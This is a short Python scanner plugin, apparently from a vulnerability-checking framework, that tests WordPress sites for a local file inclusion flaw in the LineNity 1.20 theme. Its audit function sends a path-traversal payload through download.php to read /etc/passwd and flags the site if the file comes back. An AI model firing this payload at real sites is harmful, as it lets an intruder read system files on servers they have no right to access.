#!/usr/bin/env_python
#-*- coding: utf-8 -*-
#__author__ = 'lkz'
# Name:WordPress Theme LineNity 1.20- Local File Inclusion
# refer http://www.exploit-db.com/exploits/32861
# Vulnerable File: download.php
import re


def assign(service, arg):
    if service == "wordpress":
        return True, arg


def audit(arg):
    payload = 'wp-content/themes/linenity/functions/download.php?imgurl=../../../../../../../../../../../../../../../etc/passwd'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl(url)
    if code == 200 and 'root' in res:
        sercurity_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])